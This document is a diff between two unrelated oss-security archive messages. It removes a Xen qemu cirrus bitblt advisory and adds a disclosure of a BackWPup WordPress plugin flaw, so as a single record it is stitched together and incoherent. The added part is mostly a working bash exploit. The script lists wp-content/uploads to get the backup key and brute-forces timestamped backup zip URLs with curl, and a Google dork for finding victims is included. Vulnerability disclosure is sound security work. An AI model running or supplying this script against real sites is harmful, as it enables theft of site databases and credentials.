@@ -1,98 +1,87 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/10/2
-Message-Id: <E1ccAXl-0000Q3-Dy@xenbits.xenproject.org>
-Date: Fri, 10 Feb 2017 12:43:17 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security@....org>
-Subject: Xen Security Advisory 208 (CVE-2017-2615) - oob access in cirrus bitblt copy
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/27/9
+Message-id: <A9D8E9DF-36AC-4F46-BAF1-0C6E002E0D71@me.com>
+Date: Wed, 27 Sep 2017 12:13:47 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute forcing of backup file download
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Title: Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute forcing of backup file download
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-09-08
+CVE-ID:[CVE-2017-2551]
+Download Site: https://wordpress.org/plugins/backwpup
+Vendor: Inpsyde
+Vendor Notified: 2017-09-08, fixed v3.4.2
+Vendor Contact: plugins@...dpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=201
+Description: "The backup plugin BackWPup can be used to save your complete installation including /wp-content/ and push them to an external Backup Service, like Dropbox, S3, FTP and many more."
+Vulnerability:
+There is a weakness in the way backwpup creates and stores the backup files it generates.  It creates a random string to obscure the location, but
+it uses that same string to create the storage directory under wp-content/uploads/ which in most installations of WordPress allows file listings.
 
-            Xen Security Advisory CVE-2017-2615 / XSA-208
+Someone looking to steal a copy of the database could simply list the directories in /uploads to find that random string and then brute force the location of the file as its structure is just a date and time stamp.  It would take a Maximum of 86400 tries to guess if a backup is available for that day.  
+Filename format: 
+backwpup_ RANDOMSTRINGBACKUPNUMBER_%Y-%m-%d_%H-%i-%s
 
-                   oob access in cirrus bitblt copy
+Default settings are:
 
-ISSUE DESCRIPTION
-=================
+%d = Two digit day of the month, with leading zeros
+%m = Day of the month, with leading zeros
+%Y = Four digit representation for the year
+%H = Hour in 24-hour format, with leading zeros
+%i = Two digit representation of the minute
+%s = Two digit representation of the second
 
-When doing bitblt copy backwards, qemu should negate the blit width.
-This avoids an oob access before the start of video memory.
-
-IMPACT
-======
-
-A malicious guest administrator can cause an out of bounds memory
-access, possibly leading to information disclosure or privilege
-escalation.
-
-VULNERABLE SYSTEMS
-==================
-
-Versions of qemu shipped with all Xen versions are vulnerable.
-
-Xen systems running on x86 with HVM guests, with the qemu process
-running in dom0 are vulnerable.
-
-Only guests provided with the "cirrus" emulated video card can exploit
-the vulnerability.  The non-default "stdvga" emulated video card is
-not vulnerable.  (With xl the emulated video card is controlled by the
-"stdvga=" and "vga=" domain configuration options.)
-
-ARM systems are not vulnerable.  Systems using only PV guests are not
-vulnerable.
-
-For VMs whose qemu process is running in a stub domain, a successful
-attacker will only gain the privileges of that stubdom, which should
-be only over the guest itself.
-
-Both upstream-based versions of qemu (device_model_version="qemu-xen")
-and `traditional' qemu (device_model_version="qemu-xen-traditional")
-are vulnerable.
-
-MITIGATION
-==========
-
-Running only PV guests will avoid the issue.
-
-Running HVM guests with the device model in a stubdomain will mitigate
-the issue.
-
-Changing the video card emulation to stdvga (stdvga=1, vga="stdvga",
-in the xl domain configuration) will avoid the vulnerability.
-
-RESOLUTION
-==========
-
-Applying the appropriate attached patch resolves this issue.
-
-xsa208-qemuu.patch    qemu-xen, mainline qemu
-xsa208-qemut.patch    qemu-xen-traditional
-
-$ sha256sum xsa208*
-4369cce9b72daf2418a1b9dd7be6529c312b447b814c44d634bab462e80a15f5  xsa208-qemut.patch
-1e516e3df1091415b6ba34aaf54fa67eac91e22daceaad569b11baa2316c78ba  xsa208-qemuu.patch
-$
+https://wordpress.org/plugins/backwpup
 
 
-NOTE REGARDING LACK OF EMBARGO
-==============================
-
-This issue has already been publicly disclosed.
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQEcBAEBAgAGBQJYnbVQAAoJEIP+FMlX6CvZs2sIAKtkU1ptqojrE6GpgdMegdIS
-hMcCcEVdDoYt47z9BxXcNA87kyjGLbIaliACF3GQclhBy8f6Ytm6MLQMvh79YO/l
-8AvZELKSo5U/Z1El/HQ/ezzWTV15FHwdG64HvDf7SdlRquVyS0fxWLuiq8gmWXRd
-bpGcbAwwdRHvrvguMpajif89ZfTWPSHRq8onS1C96SBJW8aUXxzzyKWoX1EvNWN3
-vnKC5eXQ5uhLERmh6meIZo2OwB7PlMTuasgVJan915/CGF8CS+B5wqQmiL0uxfRT
-fnTBVTfXHC/TzkkREJtnwgHIEv/E+Vygheeg/2P9bEaNkiN3CG5kK/ZOxgWNYU4=
-=eEKh
------END PGP SIGNATURE-----
-
-Download attachment "xsa208-qemut.patch" of type "application/octet-stream" (1518 bytes)
-
-Download attachment "xsa208-qemuu.patch" of type "application/octet-stream" (1486 bytes)
+Exploit Code:
+	• #!/bin/bash
+	• #Exploit for Wordpress Plugin BackWPup v3.4.1
+	• #Download https://wordpress.org/plugins/backwpup
+	• #CWE-552: Files or Directories Accessible to External Parties
+	• #CVE-ID: CVE-2017-2551
+	• #Google Dork: inurl:wp-content/uploads/backwpup
+	•  
+	•  
+	• #Add banner about vulnerability
+	•  
+	• KEY=`curl --silent http://$1/wp-content/uploads/|html2text |grep backups | awk -F- '{print $2}'`
+	•  
+	• #Add error checking here
+	• echo "[+] Getting Unique Key $KEY"
+	• DIR="backwpup-$KEY-backups"
+	• echo "[+] Checking directory $DIR"
+	• WPATH="$DIR/backwpup_$KEY"
+	• echo "[+] Creating Path: $WPATH"
+	• #use date command here for the default date of current day
+	• MONTH=09
+	• DAY=07
+	• YEAR=2017
+	• Z=0
+	•  
+	• echo "[+] Scanning website for available backups:"
+	• for y in `seq -w 0 23`; do
+	•         for x in `seq -w 0 59`; do
+	•                  Y=`echo "scale=2;($Z/86000)*100"|bc`;
+	•                  echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CWPATH $Y%"
+	•         for z in `seq -w 0 59`; do
+	•                  Z=$(( $Z + 1 ));
+	•                  CWPATH="http://$1/wp-content/uploads/$WPATH"01"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip";
+	•                  RESULT=`curl -s --head $CWPATH|grep 200`;
+	•                 if [ -n "$RESULT" ]; then
+	•                  echo ""
+	•                  echo "[+] Location $CWPATH Found";
+	•                  echo "[+] Received $RESULT";
+	•                  echo "Downloading......";
+	•                 # wget $CWPATH
+	•                   exit;
+	•                 fi;
+	•         done
+	•         done
+	• done
+	• echo "Completed."
+Screen Shots:
+Notes: Google Dork: inurl:wp-content/uploads/backwpup
